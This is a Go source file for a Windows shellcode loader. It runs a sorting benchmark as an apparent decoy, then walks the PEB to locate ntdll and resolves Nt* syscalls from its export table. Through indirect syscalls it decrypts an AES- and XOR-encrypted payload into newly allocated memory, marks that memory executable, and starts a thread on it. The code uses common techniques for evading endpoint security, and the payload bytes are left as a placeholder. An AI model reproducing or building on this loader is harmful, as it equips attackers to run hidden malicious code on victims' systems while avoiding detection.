package main

import (
	"fmt"
	"go-indirect/native"
	"sort"
	"strings"
	"syscall"
	"time"
	"math/rand"
	"unsafe"
	"crypto/aes"
	"crypto/cipher"
)

var xorKey string
var aesKey string


func main() {

	rand.Seed(time.Now().UnixNano())
	n := 1000
	arr := make([]int, n)
	for i := 0; i < n; i++ {
		arr[i] = rand.Intn(1000)
	}
	start := time.Now()
	stoogesort(arr, 0, n-1)
	elapsed := time.Since(start)
	fmt.Printf("StoogeSort took %s to sort %d items\n", elapsed, n)


	var PEB_LDR_DATA uintptr = uintptr(native.PtrToUInt64(uintptr(unsafe.Add(unsafe.Pointer(native.GetPEB()), 0x18))))
	var pInLoadOrderModuleList = uintptr(unsafe.Add(unsafe.Pointer(PEB_LDR_DATA), 0x10))
	var listEntry native.LIST_ENTRY = *(*native.LIST_ENTRY)(unsafe.Pointer(*&pInLoadOrderModuleList))
	var dataTableEntry native.LDR_DATA_TABLE_ENTRY = *(*native.LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(*&listEntry.Flink))
	for {
		if strings.HasSuffix(native.BytePtrToStringUni((*byte)(unsafe.Pointer(dataTableEntry.FullDllName.Buffer))), "ntdll.dll") {
			fmt.Printf("Found ntdll at %#x\n", dataTableEntry.DllBase)
			break
		}
		dataTableEntry = *(*native.LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(*&dataTableEntry.InOrderLinks.Flink))
	}

	var libAddr uintptr = dataTableEntry.DllBase
	getExports(libAddr)

	time.Sleep(50000 * time.Second)
}


func pkcs5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func aesDecrypt(crypted, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	blockSize := block.BlockSize()
	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])

	originalData := make([]byte, len(crypted))
	blockMode.CryptBlocks(originalData, crypted)

	originalData = pkcs5UnPadding(originalData)
	return originalData, nil
}

func stoogesort(arr []int, l, h int) {
	if l >= h {
		return
	}

	// If first element is larger than last, swap them
	if arr[l] > arr[h] {
		arr[l], arr[h] = arr[h], arr[l]
	}

	// If there are more than 2 elements, perform recursive sorting
	if h-l+1 > 2 {
		t := (h - l + 1) / 3

		// Recursively sort first 2/3 elements
		stoogesort(arr, l, h-t)

		// Recursively sort last 2/3 elements
		stoogesort(arr, l+t, h)

		// Recursively sort first 2/3 elements again to confirm
		stoogesort(arr, l, h-t)
	}
}



func getExports(ntdllBase uintptr) {
	var NtFunctions []native.NeedName

	var elf uint16 = native.PtrToUInt16(ntdllBase + 0x3c)
	fmt.Printf("elf_anew value is: %d\n", elf)

	var optHeader uintptr = uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), elf+0x18))
	fmt.Printf("OptHeader is at: %#x\n", optHeader)

	var pExport uintptr = uintptr(unsafe.Add(unsafe.Pointer(optHeader), 0x70))
	var exportRva uint32 = native.PtrToUInt32(pExport)
	var ordinalBase uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), exportRva+0x10)))
	var numberOfNames uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), exportRva+0x18)))
	var functionsRva uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), exportRva+0x1c)))
	var namesRva uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), exportRva+0x20)))
	var ordinalsRva uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), exportRva+0x24)))

	fmt.Printf("There are %d names\n", numberOfNames)

	// Now to get the Nt functions
	for i := 0; i < int(numberOfNames); i++ {
		//var stringptr uintptr = uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), int(native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), int(namesRva)+i*4))))))
		var functionName string = native.BytePtrToStringAnsi((*byte)(unsafe.Pointer(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), int(native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), int(namesRva)+i*4)))))))))
		if strings.HasPrefix(functionName, "Nt") && !strings.HasPrefix(functionName, "Ntdll") {
			//fmt.Printf("%s detected at %#x\n", functionName, stringptr)
			var functionOrdinal uint16 = uint16(ordinalBase) + native.PtrToUInt16(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), int(ordinalsRva)+i*2)))
			var functionRva uint32 = native.PtrToUInt32(uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), functionsRva+4*(uint32(functionOrdinal)-ordinalBase))))
			var functionPtr uintptr = uintptr(unsafe.Add(unsafe.Pointer(ntdllBase), functionRva))
			tmp := native.NeedName{FuncAddress: functionPtr, FuncName: functionName}
			NtFunctions = append(NtFunctions, tmp)
		}
	}

	// Populate the array
	NtFunctionsLowestToHighest := make([]uintptr, len(NtFunctions))
	for i := 0; i < len(NtFunctions); i++ {
		NtFunctionsLowestToHighest[i] = NtFunctions[i].FuncAddress
	}
	sort.SliceStable(NtFunctions, func(i, j int) bool {
		return NtFunctions[i].FuncAddress < NtFunctions[j].FuncAddress
	})
	// Sanity Check
	/*
		for i := 0; i < len(NtFunctions); i++ {
			fmt.Printf("%s has an ID of %d\n", NtFunctions[i].FuncName, i)
		}
	*/

	processHandle, _ := syscall.GetCurrentProcess()
	baseAddress := uintptr(0)
	zerobits := 0
	regionSize := 0x40000
	allocType := 0x3000
	protect := 0x04
	oldProt := 0
	byteSlice := []byte{//encrypted bytes go here}


	native.IndirectSyscall("NtAllocateVirtualMemory",
		NtFunctions,
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(zerobits),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(uint64(allocType)),
		uintptr(uint64(protect)))
	fmt.Printf("Base address is now %#x\n", baseAddress)

	
	// AES decryption
	aesDecrypted, _ := aesDecrypt(byteSlice, []byte(aesKey))

	// XOR decryption
	xoredData := make([]byte, len(aesDecrypted))
	for i := range aesDecrypted {
		xoredData[i] = aesDecrypted[i] ^ xorKey[i%len(xorKey)]
	}
	var numberOfBytesWritten = 0
	native.IndirectSyscall("NtWriteVirtualMemory",
		NtFunctions,
		uintptr(processHandle),
		uintptr(baseAddress),
		uintptr(unsafe.Pointer(&xoredData[0])),
		uintptr(len(xoredData)),
		uintptr(unsafe.Pointer(&numberOfBytesWritten)),
	)
	fmt.Printf("Wrote %d bytes to %#x\n", numberOfBytesWritten, baseAddress)

	native.IndirectSyscall("NtProtectVirtualMemory",
		NtFunctions,
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(0x10),
		uintptr(unsafe.Pointer(&oldProt)),
	)


	var threadHandle uintptr = 0
	native.IndirectSyscall("NtCreateThreadEx",
		NtFunctions,
		uintptr(unsafe.Pointer(&threadHandle)),
		uintptr(0x02000000),
		uintptr(0),
		uintptr(processHandle),
		uintptr(baseAddress),
		uintptr(0),
		uintptr(0), //Idk how to cast bools so we use 1/0
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)

}
